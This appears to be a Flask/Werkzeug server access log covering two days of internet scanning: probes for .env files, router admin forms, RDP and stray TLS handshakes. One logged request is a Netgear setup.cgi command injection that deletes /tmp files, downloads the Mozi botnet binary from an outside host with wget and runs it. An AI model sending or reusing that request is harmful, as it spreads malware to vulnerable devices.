+INFO:werkzeug:15.164.228.64 - - [23/Apr/2023 01:34:46] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.166 - - [23/Apr/2023 01:43:04] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:103.149.192.190 - - [23/Apr/2023 01:44:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:32] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:45] "[33mGET /admin/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:45] "[33mGET /webfig/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:185.180.143.141 - - [23/Apr/2023 01:52:58] "[33mGET /solr/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 02:06:01] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.58.114.58 - - [23/Apr/2023 03:15:54] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.58.114.58 - - [23/Apr/2023 03:15:54] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:92.118.39.82 - - [23/Apr/2023 03:18:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:13.36.165.111 - - [23/Apr/2023 03:19:33] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:198.199.116.145 - - [23/Apr/2023 03:23:41] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:198.199.116.145 - - [23/Apr/2023 03:23:41] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:45.79.181.251 - - [23/Apr/2023 03:59:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:86.193.114.78 - - [23/Apr/2023 04:04:22] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:3.27.104.196 - - [23/Apr/2023 04:06:33] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.35.18.251 - - [23/Apr/2023 04:42:01] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:141.98.10.172 - - [23/Apr/2023 04:42:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:141.98.10.172 - - [23/Apr/2023 04:42:57] "[33mPOST /HNAP1/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:16.16.56.113 - - [23/Apr/2023 05:11:41] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:18.212.251.222 - - [23/Apr/2023 05:20:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 05:22:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:102.67.202.181 - - [23/Apr/2023 05:27:04] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:102.67.202.181 - - [23/Apr/2023 05:27:04] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+INFO:werkzeug:13.48.29.31 - - [23/Apr/2023 05:41:20] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 05:59:28] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:25] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:25] "[35m[1m {  wü»¬8x$ØÒjÓ¸ÌüHûÚÕAO?Ðë,ÃE  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:25] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:25] "[35m[1m {  wÛâ=PÁãß!`ågR¥*W|;¨Ìâ/ç»ÉzôÒ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:25] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:26] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:26] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:27] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:27] "[35m[1m {  w|×GuµU×bå^ýØ½Ä]`qÙ]÷ë}/  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:27] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:27] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:68.183.227.10 - - [23/Apr/2023 06:51:28] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.197.197 - - [23/Apr/2023 07:04:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.62.197.199 - - [23/Apr/2023 07:05:55] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.197.211 - - [23/Apr/2023 07:06:32] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+ERROR:werkzeug:45.143.201.62 - - [23/Apr/2023 07:51:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:45.143.201.62 - - [23/Apr/2023 07:51:09] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.156.223.97 - - [23/Apr/2023 08:15:30] code 400, message Bad request version ('âûuGEº_¯YçP+öPãKyëÖ\x8cdÑ\x00é¢í\x16\x08IRMkÉ-\x7f¾ìµT')
+INFO:werkzeug:124.156.223.97 - - [23/Apr/2023 08:15:30] "[35m[1mÿ¢ÿ ÿ=ÿ­ÿ ÿÑÿØñ­ÿ¾Hû_5ÿ­ñlåúp7­ÍØ¢mx ç°¯iç¾¯ÈÄv~9,¨*öpDÊ$ï$¯¬Â+	ÊsÙ\&'âõú?±HwF»¿[âãÄ&ôÁÂ+}k{/C'qléÓM©/5j{Î+9õA}(¡ÏzÜ¯¤Ýé¶ÉR\Dìo¸óNO£`ÜaXaî¾i4ÔÄà[·¹`ßeºms]C<è-ÑºÙ,Ô£oà6£î¶h±¬^êÑôIÿäáçû¹ç?Æf}ð£ð6éÆ¿K(OÒ&«4Ó_ Æ¤"öHmÖ6åõÁzd`ð²âËßÈ`L y=ib#|æÁÖH4~<ØLU\}÷ÿÉ.`E1ê²}-tÇà}ÐíR7p$'áÿ¯Ì"rtôqç)js'X°d¨?æ.c(8vü/b"EýªkQ6%OÕBÝG^ùÐõýì^ïCû(p<Ý9ÇÉöLæ§tÚC´­È}D¶¯f'!§xqë ÞDS0´·\áC¹ìeªC<¼ØÏfßX­¾zoúP 0Þ(¤þ`FèÂ½ËË w¨òmP¬SJëøM4Ú_ÚèÐÌô«Ê6ñöH¸Fß'»ïµúÜÃ*@¥`+þúÞO<LjÐ~"TÃNú^ßÎ½°@~>Oú´ã ã?EâtÄ?2¡ÐÅí:×ÕÌWyÊl¹´Ù¶¤Iñë²xH¦¼ìLÅ$FJeBfb4.°¨ÆÈ1Ãx\}äõéª~ÄíÍ·æ	 âûuGEº_¯YçP+öPãKyëÖdÑ é¢íIRMkÉ-¾ìµT[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.156.223.97 - - [23/Apr/2023 08:15:31] code 400, message Bad request version ('\x95aÞ«¨·£§;\x19Þ³×')
+INFO:werkzeug:124.156.223.97 - - [23/Apr/2023 08:15:31] "[35m[1moúÀ¾¸À¤É¢Â¯¾Í¹Ï¬°« ¶±ªÎ´³µÍ¦úúúúýØøúúÂúúúúfìùúúúúûåqòúúúúúúùwhuiºê=Eð/§XJñ1Y¿±K úø¯5YÛ¡¢ à0ÌºU]<ºÇW7cÉ96Å4yRçwÍé!KEá ,)ê_I(?­Xx×ç¶7ñü;È®ÝÊ¿ÓðªÙ=ÐÐÖï«QZ`¼rhc@[zêJ|ïVÜ»\øTó=¯½8­çe~`ovÌ¶ÊÞ·8ÜØ8w9ÑÞ/Ê%Ü+sb®å&Êÿv¥í¼ê2ú7Ég)TF$H¨Ò¢4«gF+¿x*wÿÏ¨JrF.òîYÔþL6	ò5\íbÍ§|ÉzL£Äg´(ãkGkÁBæ][á?Tuaàüë«ÀåÖÕà<ê Téy-GÅRôÁÖ½i»f¼1Z-ýNC*mk¼ZaÞ«¨·£§;Þ³×[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.156.223.97 - - [23/Apr/2023 08:16:02] code 400, message Bad request syntax ('\x00\x00\x00')
+INFO:werkzeug:124.156.223.97 - - [23/Apr/2023 08:16:02] "[35m[1m   [0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:124.156.223.97 - - [23/Apr/2023 08:16:02] code 400, message Bad request syntax ('\x02')
+INFO:werkzeug:124.156.223.97 - - [23/Apr/2023 08:16:02] "[35m[1m[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:45.143.201.62 - - [23/Apr/2023 08:24:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:45.143.201.62 - - [23/Apr/2023 08:24:45] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:205.210.31.100 - - [23/Apr/2023 08:58:47] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x1bÅ´\x0eø')
+INFO:werkzeug:205.210.31.100 - - [23/Apr/2023 08:58:47] "[35m[1m Ê  ÆÅ´ø¾®pU14m¢f³ÀÇ¦1O2[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 09:06:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:192.155.90.220 - - [23/Apr/2023 09:30:44] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:43.201.67.89 - - [23/Apr/2023 09:41:01] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:185.180.143.48 - - [23/Apr/2023 10:15:23] "[33mGET /sugar_version.json HTTP/1.1[0m" 404 -
+INFO:werkzeug:87.121.221.5 - - [23/Apr/2023 10:58:16] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:15.152.212.132 - - [23/Apr/2023 12:26:54] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.88.66.237 - - [23/Apr/2023 12:37:42] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.118.39.82 - - [23/Apr/2023 12:46:31] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:134.122.135.54 - - [23/Apr/2023 13:02:58] "[33mGET /vplayer/111057.html HTTP/1.1[0m" 404 -
+INFO:werkzeug:15.152.154.193 - - [23/Apr/2023 13:12:49] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 13:21:49] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:195.96.138.114 - - [23/Apr/2023 14:09:52] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
+INFO:werkzeug:54.191.193.162 - - [23/Apr/2023 14:48:23] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:154.209.125.63 - - [23/Apr/2023 14:51:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [23/Apr/2023 14:51:36] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:154.209.125.92 - - [23/Apr/2023 14:51:36] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:154.209.125.92 - - [23/Apr/2023 14:51:37] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 14:55:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.195.93.98 - - [23/Apr/2023 14:56:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.32 - - [23/Apr/2023 15:13:28] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.32 - - [23/Apr/2023 15:25:32] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.32 - - [23/Apr/2023 15:25:33] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.32 - - [23/Apr/2023 15:25:55] "GET /static/js/notify.js HTTP/1.1" 200 -
+ERROR:werkzeug:185.170.144.3 - - [23/Apr/2023 15:38:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:185.170.144.3 - - [23/Apr/2023 15:38:01] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:128.14.209.162 - - [23/Apr/2023 15:55:20] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:172.104.11.46 - - [23/Apr/2023 15:58:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:192.241.211.12 - - [23/Apr/2023 16:04:13] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+INFO:werkzeug:192.241.216.15 - - [23/Apr/2023 16:37:58] "[33mGET /hudson HTTP/1.1[0m" 404 -
+INFO:werkzeug:162.243.146.35 - - [23/Apr/2023 16:39:06] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+ERROR:werkzeug:172.105.128.12 - - [23/Apr/2023 16:44:26] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:172.105.128.12 - - [23/Apr/2023 16:44:26] "[35m[1m   »Ûæô& gYîoìoÊ$¶ZÙÂJªZË¥î©   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:104.248.199.250 - - [23/Apr/2023 17:11:09] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:104.248.199.250 - - [23/Apr/2023 17:11:09] "[35m[1m u  qßèÅlá°ù DÊÿêä×oyó30£û1³ÔþÕ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:104.248.199.250 - - [23/Apr/2023 17:11:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:82.64.132.24 - - [23/Apr/2023 17:37:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:111.92.20.164 - - [23/Apr/2023 17:41:09] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+ERROR:werkzeug:176.97.210.59 - - [23/Apr/2023 18:07:53] code 400, message Bad request syntax ('{D79E94C5-70F0-46BD-965B-E17497CCB598}')
+INFO:werkzeug:176.97.210.59 - - [23/Apr/2023 18:07:53] "[35m[1m{D79E94C5-70F0-46BD-965B-E17497CCB598}[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 18:48:16] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:179.43.177.243 - - [23/Apr/2023 19:54:05] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 19:55:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:113.108.9.38 - - [23/Apr/2023 20:25:54] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:109.237.97.180 - - [23/Apr/2023 20:50:23] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.97.180 - - [23/Apr/2023 20:50:23] code 400, message Bad request version ('8hÓ¾o%\x05\x99\x10\\ÛÖÙsX_Ë<\x16¼\x14X«5ß9\x1b!\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+INFO:werkzeug:109.237.97.180 - - [23/Apr/2023 20:50:23] "[35m[1mH D{lØÔÜõzú	°]¯¢\¸ÓùYµBï "t8hÓ¾o%\ÛÖÙsX_Ë<¼X«5ß9! bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:109.237.98.226 - - [23/Apr/2023 21:04:56] "[33mGET /.env HTTP/1.1[0m" 404 -
+ERROR:werkzeug:109.237.98.226 - - [23/Apr/2023 21:04:56] code 400, message Bad request version ('\x16\x87\x87^µ\x9c½è¯nÝ;}\x98<\x03¢Ä(ì³:\x96ÈFI®\x92¢K\x0f\x8b\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+INFO:werkzeug:109.237.98.226 - - [23/Apr/2023 21:04:56] "[35m[1mH D[í¬»ÖjÄ*6%?w[Â#('zIºîÉb« ^µ½è¯nÝ;}<¢Ä(ì³:ÈFI®¢K bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.32.162.159 - - [23/Apr/2023 22:03:02] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.235.24.96 - - [23/Apr/2023 23:04:01] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:176.118.160.24 - - [23/Apr/2023 23:19:24] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.35.18.243 - - [24/Apr/2023 00:29:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.35.18.243 - - [24/Apr/2023 00:29:39] "[33mPOST /HNAP1/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 01:24:02] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:223.247.178.167 - - [24/Apr/2023 01:24:08] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 01:53:55] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:92.118.39.82 - - [24/Apr/2023 02:40:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:172.104.11.4 - - [24/Apr/2023 03:52:51] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 04:10:12] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.38 - - [24/Apr/2023 04:43:52] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.38 - - [24/Apr/2023 04:43:52] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:167.248.133.38 - - [24/Apr/2023 04:43:52] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.248.133.38 - - [24/Apr/2023 04:43:52] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:167.248.133.38 - - [24/Apr/2023 04:43:52] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:49.89.171.242 - - [24/Apr/2023 05:45:49] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://49.89.171.242:52930/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+INFO:werkzeug:71.6.232.23 - - [24/Apr/2023 06:09:40] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 06:50:09] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:205.210.31.175 - - [24/Apr/2023 07:28:31] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03â0Ö÷g')
+INFO:werkzeug:205.210.31.175 - - [24/Apr/2023 07:28:31] "[35m[1m Ê  Æâ0Ö÷g[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:161.35.236.158 - - [24/Apr/2023 08:58:14] code 400, message Bad request syntax ('\x00\x0e8mcEÚ[m<h\x00\x00\x00\x00\x00')
+INFO:werkzeug:161.35.236.158 - - [24/Apr/2023 08:58:14] "[35m[1m 8mcEÚ[m<h     [0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:74.82.47.5 - - [24/Apr/2023 09:17:41] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:74.82.47.5 - - [24/Apr/2023 09:19:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:74.82.47.5 - - [24/Apr/2023 09:20:51] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 09:25:31] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:50] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:50] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:50] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:50] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:51] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:91.240.118.35 - - [24/Apr/2023 09:34:51] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:61.72.13.225 - - [24/Apr/2023 09:47:25] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.199.102.126 - - [24/Apr/2023 09:56:15] code 400, message Bad request syntax ('MGLNDD_46.38.236.126_80')
+INFO:werkzeug:198.199.102.126 - - [24/Apr/2023 09:56:15] "[35m[1mMGLNDD_46.38.236.126_80[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:192.241.223.20 - - [24/Apr/2023 10:13:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:117.245.9.126 - - [24/Apr/2023 10:22:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 10:50:15] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:37.221.92.199 - - [24/Apr/2023 11:48:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:198.20.101.106 - - [24/Apr/2023 12:07:11] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.20.101.106 - - [24/Apr/2023 12:08:01] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:198.20.101.106 - - [24/Apr/2023 12:08:01] "[35m[1m î  ê²³®1²H7l´[j¹°ÆJfbQªkáx7^ 5ë1¯\(óÂ<×3Ñó Þ±»*mOêë5¿ &Ì¨Ì©À/À0À+À,ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:193.47.61.4 - - [24/Apr/2023 12:14:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 12:22:41] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:45.88.66.237 - - [24/Apr/2023 13:50:03] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+INFO:werkzeug:142.4.218.114 - - [24/Apr/2023 14:07:23] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:35.195.241.126 - - [24/Apr/2023 14:23:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:95.214.27.51 - - [24/Apr/2023 15:16:12] "[33mGET /.env HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.51 - - [24/Apr/2023 15:16:12] "[33mGET /wp-content/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:193.32.162.159 - - [24/Apr/2023 15:18:49] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:195.178.120.37 - - [24/Apr/2023 15:24:27] code 400, message Bad request syntax ('{D79E94C5-70F0-46BD-965B-E17497CCB598}')
+INFO:werkzeug:195.178.120.37 - - [24/Apr/2023 15:24:27] "[35m[1m{D79E94C5-70F0-46BD-965B-E17497CCB598}[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:44:14] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:48] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:48] "[35m[1m {  wJ.y&)d¢kÓ/Pm¢}-²Þ÷¸í  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:48] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:48] "[35m[1m {  w#}¹oã0N\ñªÜç _9Ô¼$~ÌH*»SU)  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:48] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:49] "[33mGET /client/get_targets HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:49] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:49] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:49] "[35m[1m {  wç·Ýö¯2Læïº	´ÁÖµÛCü¾LÅ÷åûóvþ  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:49] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:50] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:64.227.27.245 - - [24/Apr/2023 15:44:50] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:52:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:52:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:52:04] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:52:05] "GET /static/js/main.js HTTP/1.1" 200 -
+INFO:werkzeug:183.136.225.32 - - [24/Apr/2023 15:52:18] "GET /static/js/notify.js HTTP/1.1" 200 -
+ERROR:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+INFO:werkzeug:94.232.42.99 - - [24/Apr/2023 15:57:10] "[35m[1m  ,'à     Cookie: mstshash=Domain[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:45.33.80.243 - - [24/Apr/2023 15:58:24] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:45.33.80.243 - - [24/Apr/2023 15:58:24] "[35m[1m   òöéæ#O¨)zRgKJí$=õ¤'J²ý¤   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:198.20.101.106 - - [24/Apr/2023 16:04:16] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:198.20.101.106 - - [24/Apr/2023 16:05:06] code 400, message Bad request version ('À\x14À')
